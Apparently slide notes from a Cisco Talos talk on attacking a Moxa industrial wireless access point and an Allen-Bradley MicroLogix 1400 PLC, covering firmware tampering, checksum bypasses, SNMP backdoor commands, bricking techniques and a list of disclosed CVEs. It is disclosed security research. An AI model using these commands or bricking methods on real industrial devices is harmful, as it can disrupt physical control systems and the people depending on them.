# MOXA WAP: Exploitation and Bricking

## Potential Exploits
- **Modify Legitimate Binaries:**
  - Alter the `serviceAgent` binary to deliver custom payloads.
  - Use the Moxa Windows configuration application to potentially allow an attacker to "swim upstream," moving from the device up into the IT network.

- **Bypass Read-Only Restrictions:**
  - Kill legitimate processes and run malicious code from `/var`.
  - Patch the firmware install binary to skip integrity checks.
  - Utilize `iptables`, tunnels, and other methods to capture all traffic.
  - Manipulate Linux kernel modules using `insmod`, `lsmod`, and `rmmod`.

- **Change RF Parameters:**
  - Modify frequency, channel, strength, and other radio parameters.

## Bricking the Device
### Soft Brick
- **Kill All Processes:**
  - Use `killall5` to send a signal to all processes except kernel threads and those in its own session. This will require a manual hard power cycle to recover.
  - The physical reset button may not work.
  - Play with mounting and unmounting filesystems.

### Firm Brick
- **Firmware Environment Modification:**
  - Suspect that the bricking occurred due to the use of `fw_setenv`, followed by several `mount`/`umount` operations, and a reboot.
  - The device never came back from the reboot, and despite having full console logs, it has not been possible to verify the exact cause.
  - Currently, only one functional device remains.

#### Example Commands:
```sh
/ # fw_setenv
Unlocking flash... Done
Erasing old environment... Done
Writing environment to /dev/mtd1... Done
Locking... Done
/ # mount -o remount,rw --a
/ # reboot
```

## CVEs for Moxa AWK-3131A
1. **CVE-2016-8717 (Hard-coded Administrator Credentials Vulnerability)**
   - CVSS Score: 10.0
2. **CVE-2016-8721 (Web Application Ping Command Injection Vulnerability)**
   - CVSS Score: 9.1
3. **CVE-2016-8723 (HTTP GET Denial of Service Vulnerability)**
   - CVSS Score: 7.5
4. **CVE-2016-8716 (Web Application Cleartext Transmission of Password Vulnerability)**
   - CVSS Score: 7.5
5. **CVE-2016-8718 (Web Application Cross-Site Request Forgery Vulnerability)**
   - CVSS Score: 7.5
6. **CVE-2016-8719 (Web Application Multiple Reflected Cross-Site Scripting Vulnerabilities)**
   - CVSS Score: 7.5
7. **CVE-2016-8712 (Web Application Nonce Reuse Vulnerability)**
   - CVSS Score: 5.9
8. **CVE-2016-8722 (Web Application asqc.asp Information Disclosure Vulnerability)**
   - CVSS Score: 5.3
9. **CVE-2016-8720 (Web Application bkpath HTTP Header Injection Vulnerability)**
   - CVSS Score: 3.1
10. **CVE-2016-0241 (Web Application onekey Information Disclosure Vulnerability)**
    - CVSS Score: 7.5
11. **CVE-2016-8725 (Web Application systemlog.log Information Disclosure Vulnerability)**
    - CVSS Score: 5.3
12. **CVE-2016-8724 (serviceAgent Information Disclosure Vulnerability)**
    - CVSS Score: 5.3
13. **CVE-2016-8726 (web_runScript Header Manipulation Denial of Service Vulnerability)**
    - CVSS Score: 7.5

# AB MicroLogix 1400 PLC

## Overview
- **Programmable Logic Controller (PLC):**
  - Used for "micro" and "nano" control systems, such as conveyor automation, security systems, and building and parking lot lighting.
  - Includes built-in Input/Output, Ethernet, and Serial ports, and supports expansion I/O.

## Firmware Analysis
- **Limited Tools:**
  - `binwalk` and `strings` were not very helpful.
  - Limited analysis tools available.

### SNMP Backdoor
- **SNMP Walk:**
  ```sh
  snmpwalk -v 2c -c public 192.168.42.11
  ```
- **SNMP Backdoor Access:**
  ```sh
  snmpwalk -c public -v 2c 192.168.42.11 .1.3.6.1.4.1.95
  ```

### Modifying Firmware
- **Set SNMP Values:**
  ```sh
  ~# snmpset -c wheel -v 2c 192.168.42.11 .1.3.6.1.4.1.95.2.2.1.1.1.0 a
  ~# snmpset -c wheel -v 2c 192.168.42.11 .1.3.6.1.4.1.95.2.2.1.1.2.0 s "‚Äù
  ~# snmpset -c wheel -v 2c 192.168.42.11 .1.3.6.1.4.1.95.2.3.1.1.1.1.0 i 2
  ```

### Bypassing Integrity Checks
- **Self-Reported Checksum:**
  - Basic math-based checksums can be bypassed easily.
  - Two methods:
    1. Update all occurrences of checksums in the firmware to match the modified firmware.
    2. Make "zero sum" byte changes to compensate for modifications.
      - Example: `0x12 0x34` to `0x34 0x12`
      - Example: `0x42 0x42` to `0x41 0x43`
      - Example: `0x00 0x00 0x00 0xFF` to `0x41 0x42 0x43 0x39`

### Bricking the PLC
- **Soft Brick:**
  - Use jumps to start of code or self-referencing jumps.
  - Example:
    ```sh
    4EF9 0004 0150
    JMP 0x00040150
    JMP to start of code
    0x150 bytes in
    offset 0x40000
    4EF9 0004 0000
    JMP 0x00040000
    JMP to self
    ```

- **Firm Brick:**
  - Unsuccessful with creative Coldfire instruction changes and jump loops.
  - Successful with random byte movements that are important but not Coldfire instructions.

## Conclusion
- **Summary:**
  - From box to backdoor to brick, the process involves modifying binaries, bypassing integrity checks, and potentially bricking the device.
- **Acknowledgments:**
  - Cisco Talos for support and beer.
  - Moxa Americas for BusyBox GPL'd source code and coordinated disclosure.
  - Rockwell Automation/Allen-Bradley for coordinated disclosure.

**Contact:**
- Patrick DeSantis | @pat_r10t
- Blog: [blog.talosintelligence.com](https://blog.talosintelligence.com)
- Twitter: [@talossecurity](https://twitter.com/talossecurity)